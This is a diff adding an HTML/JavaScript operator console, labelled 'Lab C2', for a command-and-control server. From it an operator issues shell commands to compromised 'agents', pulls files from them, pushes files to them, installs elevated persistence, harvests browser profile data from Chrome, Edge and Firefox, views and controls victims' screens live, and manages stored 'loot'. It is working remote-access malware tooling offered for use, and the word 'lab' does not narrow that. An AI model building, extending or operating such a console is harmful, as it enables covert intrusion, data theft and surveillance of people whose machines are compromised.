@@ -1,0 +1,402 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Lab C2</title>
+<style>
+body{font-family:monospace;background:#111;color:#ccc;margin:2em}
+button,input,select{font-family:monospace;background:#222;color:#ccc;border:1px solid #444;padding:4px 8px;margin:2px}
+button{color:#7c7}
+
+/* ---- button click feedback ---- */
+button{
+  position:relative;
+  overflow:hidden;
+  cursor:pointer;
+  transition:background .12s ease, border-color .12s ease,
+             transform .06s ease, box-shadow .12s ease;
+  -webkit-tap-highlight-color:transparent;
+}
+button:hover{background:#2a2a2a;border-color:#555}
+button:active{transform:translateY(1px) scale(.98)}
+button:focus-visible{outline:1px solid #7c7;outline-offset:2px}
+
+@keyframes btn-ok{
+  0%   {background:#1e3a1e;border-color:#4c4;color:#bfb}
+  100% {background:#222;border-color:#444;color:#7c7}
+}
+button.ok{animation:btn-ok .8s ease-out;}
+
+.ripple{
+  position:absolute;
+  border-radius:50%;
+  transform:scale(0);
+  background:rgba(124,255,124,.35);
+  pointer-events:none;
+  animation:ripple .45s ease-out;
+}
+@keyframes ripple{to{transform:scale(4);opacity:0}}
+
+fieldset{border:1px solid #333;max-width:900px;margin:1em 0}
+pre{background:#181818;padding:1em;max-height:420px;overflow:auto;white-space:pre-wrap}
+
+select#agent{min-width:520px}
+</style>
+</head>
+<body>
+<h2>Lab C2 Console</h2>
+<select id="agent"></select>
+<button onclick="deleteAgent()" style="color:#f88">Delete agent history</button>
+
+<fieldset><legend>Agent lifecycle</legend>
+<button onclick="task('pause')">Pause</button>
+<button onclick="task('resume')">Resume</button>
+<button onclick="task('terminate')" style="color:#f88">Terminate</button>
+<hr>
+<button onclick="task('install_elevated_persist')">Install elevated persistence</button>
+</fieldset>
+
+<fieldset><legend>Queue a task</legend>
+<button onclick="task('sys')">Sysinfo</button>
+<button onclick="task('ps')">List Processes</button>
+<button onclick="task('run')">Run runtime</button><br>
+<input id="cmd" size="40" placeholder="whoami">
+<button onclick="task('exec', document.getElementById('cmd').value)">exec</button><br>
+<input id="path" size="40" placeholder="C:\\Users\\you\\file.txt">
+<button onclick="task('download', document.getElementById('path').value)">download file</button><br>
+<input id="slep" size="3" value="5">
+<button onclick="task('sleep', document.getElementById('slep').value)">set interval (s)</button>
+</fieldset>
+
+<fieldset><legend>Browser summary</legend>
+<button onclick="showExtensions()">Show extensions/platforms</button>
+</fieldset>
+
+<fieldset><legend>Live view</legend>
+<button onclick="openPage('live')">Live View</button>
+<button onclick="openPage('control')">Remote Control</button><br>
+<button onclick="task('live','on')">Live ON</button>
+<input id="fps" size="2" value="3">
+<button onclick="task('live',document.getElementById('fps').value)">set fps</button>
+<button onclick="task('live','off')">Live OFF</button>
+</fieldset>
+
+<fieldset><legend>Upload file from server to agent</legend>
+<input id="up_path" size="50" placeholder="C:\\Users\\you\\Desktop\\file.bin">
+<input type="file" id="up_file">
+<button onclick="pushFile()">Upload to agent</button>
+</fieldset>
+
+<pre id="out"></pre>
+
+<script>
+const API = '/api/proxy';
+const out = document.getElementById('out');
+const sel = document.getElementById('agent');
+let lastSelected = '';
+let busy = false;
+let agentsCache = {};   // key -> agent record (from /admin/agents)
+
+function log(m){ out.textContent = m + "\n" + out.textContent; }
+
+/* ---- button click feedback ---- */
+function attachRipple(){
+    document.querySelectorAll('button').forEach(b => {
+        if (b.dataset.ripple === '1') return;
+        b.dataset.ripple = '1';
+        b.addEventListener('pointerdown', e => {
+            const r = b.getBoundingClientRect();
+            const size = Math.max(r.width, r.height);
+            const span = document.createElement('span');
+            span.className = 'ripple';
+            span.style.width  = span.style.height = size + 'px';
+            span.style.left   = (e.clientX - r.left - size / 2) + 'px';
+            span.style.top    = (e.clientY - r.top  - size / 2) + 'px';
+            b.appendChild(span);
+            setTimeout(() => span.remove(), 500);
+        });
+    });
+}
+function flashOk(btn){
+    if (!btn) return;
+    btn.classList.remove('ok');
+    void btn.offsetWidth;
+    btn.classList.add('ok');
+    setTimeout(() => btn.classList.remove('ok'), 850);
+}
+
+/* ---- timestamp helpers ---- */
+function fmtTs(ts){
+    if (!ts) return '';
+    const d = new Date(ts * 1000);
+    const pad = n => String(n).padStart(2, '0');
+    return d.getFullYear() + '-' + pad(d.getMonth()+1) + '-' + pad(d.getDate())
+         + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
+}
+function fmtAgo(ts){
+    if (!ts) return '';
+    const s = Math.max(0, Math.floor(Date.now()/1000 - ts));
+    if (s < 60)   return s + 's ago';
+    if (s < 3600) return Math.floor(s/60) + 'm ago';
+    if (s < 86400)return Math.floor(s/3600) + 'h ago';
+    return Math.floor(s/86400) + 'd ago';
+}
+
+/* ---- label builder ---- */
+function buildAgentLabel(a, key, hideLast){
+    const unread = a.unread || 0;
+    const first  = a.first_seen || 0;
+    const last   = a.last_seen  || 0;
+
+    let label = (a.badge || '') + ' ' + key;
+    const parts = [];
+    if (first) parts.push('added ' + fmtTs(first));
+    if (!hideLast && last) parts.push('last ' + fmtAgo(last));
+    if (parts.length) label += '   [' + parts.join(' · ') + ']';
+    if (unread > 0) label += '   (+' + unread + ')';
+    return label;
+}
+
+/* ---- agent list ---- */
+async function loadAgents(){
+    const resp = await fetch(API + '/admin/agents');
+    if (!resp.ok) {
+        out.textContent = '[!] admin fetch failed: HTTP ' + resp.status;
+        return;
+    }
+    const r = await resp.json();
+    agentsCache = r;
+
+    const ids = Object.keys(r).sort();
+    const current = sel.value;
+    sel.innerHTML = '';
+
+    ids.forEach(k => {
+        const a = r[k];
+        const o = document.createElement('option');
+        o.value = k;
+        o.textContent = buildAgentLabel(a, k, /*hideLast=*/ k === current);
+        o.title = 'name=' + k +
+                  '\nfirst_seen=' + (a.first_seen ? new Date(a.first_seen*1000).toLocaleString() : '-') +
+                  '\nlast_seen='  + (a.last_seen  ? new Date(a.last_seen *1000).toLocaleString() : '-') +
+                  '\nstatus='     + (a.display || '');
+        sel.appendChild(o);
+    });
+
+    if (current && ids.includes(current)) sel.value = current;
+    if (!sel.value && sel.options.length) sel.value = sel.options[0].value;
+
+    relabelSelection();
+
+    maybeMarkSeen();
+    if (!busy) loadResults();
+}
+
+/* Re-render every option label based on the current selection, so the
+   selected one hides "last ..." and the others show it. */
+function relabelSelection(){
+    const a = sel.value;
+    for (const opt of sel.options){
+        const rec = agentsCache[opt.value];
+        if (!rec) continue;
+        opt.textContent = buildAgentLabel(rec, opt.value,
+                                          /*hideLast=*/ opt.value === a);
+    }
+}
+
+async function maybeMarkSeen(){
+    const a = sel.value;
+    if (!a) return;
+    if (a === lastSelected) return;
+    lastSelected = a;
+    try {
+        await fetch(API + '/admin/agent/' + encodeURIComponent(a) + '/seen',
+                    {method:'POST'});
+    } catch (e) {}
+}
+
+sel.addEventListener('change', () => {
+    relabelSelection();
+    lastSelected = '';
+    maybeMarkSeen();
+    loadResults();
+});
+
+async function loadResults(){
+    if (busy) return;
+    const a = sel.value;
+    if (!a) return;
+    const r = await (await fetch(API + '/admin/results/' + encodeURIComponent(a))).json();
+    out.textContent = r.map(e =>
+      `[${new Date(e.ts*1000).toLocaleTimeString()}] ${e.type}${e.task?'('+e.task+')':''}: ${(e.data ?? '').toString()}`
+    ).join('\n') || '(no results yet)';
+}
+
+async function task(type, arg='', ev){
+    const btn = ev && ev.currentTarget ? ev.currentTarget : null;
+    const a = sel.value;
+    if (!a) return alert('Refresh agents first');
+    try {
+        const r = await (await fetch(API + '/admin/task', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({agent:a, type, arg})
+        })).json();
+        if (r.ok) flashOk(btn);
+        log(r.ok ? '[+] queued: ' + type + ' ' + arg : '[!] ' + r.error);
+    } catch (e) {
+        log('[!] task failed: ' + e);
+    }
+}
+
+async function showExtensions(ev){
+    const btn = ev && ev.currentTarget ? ev.currentTarget : null;
+    const a = sel.value;
+    if (!a) return alert('Refresh agents first');
+    busy = true;
+    out.textContent = '[*] queuing browser harvest (chrome + edge + firefox)…';
+
+    const q = await (await fetch(API + '/admin/task', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({agent:a, type:'browser', arg:'all'})
+    })).json();
+    if (!q.ok){
+        busy = false;
+        out.textContent = '[!] ' + (q.error || 'failed to queue');
+        return;
+    }
+    flashOk(btn);
+
+    const waitResult = Date.now() + 60000;
+    let sawResult = false;
+    while (Date.now() < waitResult){
+        await new Promise(r => setTimeout(r, 1500));
+        const r = await fetch(API + '/admin/results/' + encodeURIComponent(a));
+        if (!r.ok) continue;
+        const list = await r.json();
+        for (let i = list.length - 1; i >= 0; i--){
+            if (list[i].type === 'browser'){
+                out.textContent = '[agent report tail]\n' +
+                    String(list[i].data).split('\n').slice(-12).join('\n');
+                sawResult = true;
+                break;
+            }
+        }
+        if (sawResult) break;
+    }
+    if (!sawResult){
+        busy = false;
+        out.textContent = '[!] agent did not return a browser result in 60s.';
+        return;
+    }
+
+    const deadline = Date.now() + 60000;
+    while (Date.now() < deadline){
+        await new Promise(r => setTimeout(r, 2000));
+        const r = await fetch(API + '/admin/extensions/' + encodeURIComponent(a));
+        if (!r.ok) continue;
+        const j = await r.json();
+        if (j && j.ok === false) continue;
+        if (j && (Object.keys(j.chrome || {}).length ||
+                  Object.keys(j.edge   || {}).length ||
+                  Object.keys(j.firefox|| {}).length)){
+            renderExtensions(j);
+            busy = false;
+            return;
+        }
+    }
+    busy = false;
+    out.textContent += '\n\n[!] no parsed summary yet (check server terminal).';
+}
+
+function renderExtensions(j){
+    const lines = [];
+    for (const browser of ['chrome', 'edge', 'firefox']){
+        const profiles = j[browser] || {};
+        for (const [prof, s] of Object.entries(profiles)){
+            lines.push(`--- ${browser} / ${prof} ---`);
+            const ex = (s && s.extensions) || [];
+            if (!ex.length){
+                lines.push('  (none)');
+            } else {
+                for (const e of ex){
+                    const nm = (typeof e === 'string') ? e : (e.name || e.id || '');
+                    if (nm) lines.push('  ' + nm);
+                }
+            }
+            lines.push('');
+        }
+    }
+    out.textContent = lines.join('\n') || '(no profiles found)';
+}
+
+async function pushFile(ev){
+    const btn = ev && ev.currentTarget ? ev.currentTarget : null;
+    const a = sel.value;
+    if (!a) return alert('Refresh agents first');
+    const path = document.getElementById('up_path').value;
+    if (!path) return alert('Specify the destination path on the agent');
+    const f = document.getElementById('up_file').files[0];
+    if (!f) return alert('Pick a file to upload');
+    if (f.size > 20*1024*1024) return alert('File is larger than 20 MB');
+
+    const buf = await f.arrayBuffer();
+    let bin = '';
+    const bytes = new Uint8Array(buf);
+    const chunk = 0x8000;
+    for (let i = 0; i < bytes.length; i += chunk) {
+        bin += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
+    }
+    const b64 = btoa(bin);
+
+    const r = await (await fetch(API + '/admin/pushfile', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({agent:a, path:path, name:f.name, data_b64:b64})
+    })).json();
+    if (r.ok) flashOk(btn);
+    log(r.ok ? `[+] pushfile queued: ${f.name} (${r.size} bytes) -> ${path}`
+             : `[!] pushfile failed: ${r.error}`);
+}
+
+async function deleteAgent(ev){
+    const btn = ev && ev.currentTarget ? ev.currentTarget : null;
+    const a = sel.value;
+    if (!a) return alert('Refresh agents first');
+    if (!confirm('Delete ALL history for "' + a + '"?\nThis removes loot/' + a + '/ and unregisters it.\nThis cannot be undone.'))
+        return;
+    const r = await (await fetch(API + '/admin/agent/' + encodeURIComponent(a),
+                                 {method:'DELETE'})).json();
+    if (r.ok) flashOk(btn);
+    log(r.ok ? '[x] deleted: ' + a : '[!] delete failed');
+    lastSelected = '';
+    loadAgents();
+}
+
+function openPage(kind, ev){
+    const btn = ev && ev.currentTarget ? ev.currentTarget : null;
+    if (!sel.value) return alert('Refresh agents first');
+    if (btn) flashOk(btn);
+    window.open('/' + kind + '?aid=' + encodeURIComponent(sel.value),
+                '_blank', 'width=1100,height=800');
+}
+
+/* ---- wire it up ---- */
+attachRipple();
+
+document.querySelectorAll('button[onclick]').forEach(b => {
+    const src = b.getAttribute('onclick');
+    if (!src) return;
+    b.removeAttribute('onclick');
+    b.addEventListener('click', function(ev){
+        try { (new Function('event', src)).call(this, ev); }
+        catch (e) { console.error(e); }
+    });
+});
+
+loadAgents();
+setInterval(loadAgents, 4000);
+</script>
+</body>
+</html>
